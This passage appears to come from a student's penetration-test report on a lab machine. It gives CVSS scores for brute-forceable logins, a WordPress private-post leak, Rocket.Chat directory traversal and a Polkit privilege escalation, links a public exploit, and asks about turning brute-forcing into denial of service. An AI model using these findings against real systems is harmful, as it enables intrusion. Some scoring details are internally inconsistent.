     - Exploit Code Maturity: High - No exploit is required (manual trigger).
     - Remediation Level: Official Fix - Introduce a limit to the amount of times you can execute this operation unsuccessfully. Set a time limit or IP block.
     - Report Confidence: Confirmed - Enumeration in login input fields is a common well known vulnerability.

3. Possibility to Brute Force User Credentials in the Login Portal (9.8/9.4/Critical) (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C)

   ![image-20220414224126450](/home/kali/.config/Typora/typora-user-images/image-20220414224126450.png)

   - Exploitability Metrics
     - Attack Vector: Network - The target it “remotely exploitable”. **(Should it be network because it is exploitable from the internet if the target is using wordpress OR is it adjacent because in our specific situation we can only access the target through the vpn?).**
     - Attack Complexity: Low - An attacker can expect repeatable success when attacking the vulnerable component.
     - Privileges Required: Low - The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to  carry out an attack.
     - User Interaction: None - The vulnerable system can be exploited without interaction from any user.
   - Scope Metric
     - Scope: Unchanged - In this case, I think that the vulnerable component and the impacted component is the **web application**.
   - Impact Metrics
     - Confidentiality: High - There is a total loss of confidentiality, resulting in all resources  within the impacted component being divulged to the attacker.
     - Integrity: High - There is a total loss of integrity, or a complete loss of protection.  For example, the attacker is able to modify any/all files protected by  the impacted component.
     - Availability: High - There is a total loss of availability, resulting in the attacker being  able to fully deny access to resources in the impacted component.
   - Temporal Metrics
     - Exploit Code Maturity: High - Performing a brute force attack using online tools is a well known process: very simple and mature.
     - Remediation Level: Official Fix - IP ban/block, timeout could be a reasonable solution.
     - Report Confidence: Confirmed - Detailed reports exist, or functional reproduction is possible such as in this walkthrough. After performing a wordlist attack with a large set of words at no point did the application throw an error or block my connection. 

4. WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts (5.3/5.1/Medium) (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:H/RL:O/RC:C)

   - Exploitability Metrics
     - Attack Vector: Network - The target it “remotely exploitable”. **(Should it be network because it is exploitable from the internet if the target is using wordpress OR is it adjacent because in our specific situation we can only access the target through the vpn?).**
     - Attack Complexity: Low - An attacker can expect repeatable success when attacking the vulnerable component.
     - Privileges Required: None - The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to  carry out an attack.
     - User Interaction: None - The vulnerable system can be exploited without interaction from any user.
   - Scope Metric
     - Scope: Unchanged - In this case, I think that the vulnerable component and the impacted component is the **web application**.
   - Impact Metrics
     - Confidentiality: Low - There is some loss of confidentiality. Access to some restricted information is obtained.
     - Integrity: None - There is no loss of integrity within the impacted component.
     - Availability: None - There is no impact to availability within the impacted component.
   - Temporal Metrics
     - Exploit Code Maturity: High - No exploit is required (manual trigger) and details are widely available (CVE-2019-17671).
     - Remediation Level: Official Fix - A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available. To fix the exploit you can update wordpress.
     - Report Confidence: Confirmed - Detailed reports exist, or functional reproduction is possible such as in this walkthrough.

5. Directory Transversal and Read access to Web Server Files (5/Medium) (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N)

   - Exploitability Metrics
     - Attack Vector: Network - The target it “remotely exploitable”. **(Should it be network because it is exploitable from the internet if the target is using wordpress OR is it adjacent because in our specific situation we can only access the target through the vpn?).**
     - Attack Complexity: Low - An attacker can expect repeatable success when attacking the vulnerable component.
     - Privileges Required: Low - The attacker has to have an account in the rocket chat web application.
     - User Interaction: None - The vulnerable system can be exploited without interaction from any user.
   - Scope Metric
     - Scope: Changed - In this case, I think that the vulnerable component is the **web application** and the impacted component is the **server**.
   - Impact Metrics
     - Confidentiality: Low - There is some loss of confidentiality. Access to some restricted information is obtained.
     - Integrity: None - There is no loss of integrity within the impacted component. We are not able to edit files.
     - Availability: None - There is no impact to availability within the impacted component. We are not able to delete files.

6. Polkit Privilege Escalation (7.8/7.5/High) (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C)

   - Exploitability Metrics
     - Attack Vector: Local - The attacker exploits the vulnerability by accessing the target system locally (e.g., keyboard, console), or **remotely (e.g., SSH);**
     - Attack Complexity: Low - Despite not always working, since the exploit is easily accessible using a script or executing a metasploit module we can say it is relatively simple to execute consistently.
     - Privileges Required: Low - You need to have a shell as a user to be capable to use this exploit.
     - User Interaction: None - The vulnerable system can be exploited without interaction from any user.
   - Scope Metric
     - Scope: Unchanged - In this case, I think that the vulnerable component is the **OS** and the impacted component is also the **OS**.
   - Impact Metrics
     - Confidentiality: High - There is a total loss of confidentiality, resulting in all resources  within the impacted component being divulged to the attacker.
     - Integrity: High - There is a total loss of integrity, or a complete loss of protection.  For example, the attacker is able to modify any/all files protected by  the impacted component.
     - Availability: High - There is a total loss of availability, resulting in the attacker being  able to fully deny access to resources in the impacted component, for example by deleting files.
   - Temporal Metrics
     - Exploit Code Maturity: High - Functional autonomous code exists, or no exploit is required (manual trigger) and details are widely available. https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
     - Remediation Level: Official Fix - A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available. To fix the exploit you can download the fixed packages from the Linux distribution websites.
     - Report Confidence: Confirmed - Detailed reports exist, or functional reproduction is possible such as in this walkthrough.

### 7.2 Vulnerabilities discovered using Nessus

For a complete report of every vulnerability I will provide the Nessus PDF report.

1. CGI Generic SSI Injection (HTTP headers)
1. Browsable Web Directories
2. Backup Files Disclosure
3. mDNS Detection (Remote Network)
4. Web Application Information Disclosure
5. Web Application Potentially Vulnerable to Clickjacking
6. HTTP TRACE/TRACK Methods Allowed
8. SSL Certificate Cannot Be Trusted 
9. SSL Self-Signed Certificate 
10. WordPress User Enumeration
11. WordPress Version Detection
14. SSH Weak Key Exchange Algorithms Enabled
15. SSH Server CBC Mode Ciphers Enabled
15. Web Server Transmits Cleartext Credentials
15. Web Server Allows Password Auto-Completion

## 8. Questions

1. Was there any other way where I could have found that office.paper existed?
2. Why am I getting a 403 Forbidden when using OpenSSL?
3. Does performing File Directory Enumeration on the **IP** vs the **hostname** provide different results? I am under the impression that the answer is yes (tested getting /wp-login with the ip and office.paper outputted different results).
4. What is office.htb?
5. [WordPress Core 5.2.3 - Cross-Site Host Modification](https://www.exploit-db.com/exploits/47361) how does this exploit work?
6. Is there a database? I read that Wordpress uses MySQL but why can't i detect any ports running this service? Is it on another server?
7. Why couldn't I perform a Privilege Escalation using Metasploit? Where did I make a mistake? Which payload should i have used?
8. Help me understand the difference between a network and adjacent attack vector. Did I correctly classify the vulnerabilities  in this category? 
9. Same question but in regards to the Scope base metric.
10. Should I separate the vulnerabilities into IP vs office.paper vs chat.office.paper or just by the IP? 
11. In the full findings excel should I identify the Polkit vulnerability with what port? I used port 22 because that was our entry point to get shell.
4. If the application was still working using a large wordlist to try and crack the password of prisonmike could I escalate this into an attempt to deny the service of the target?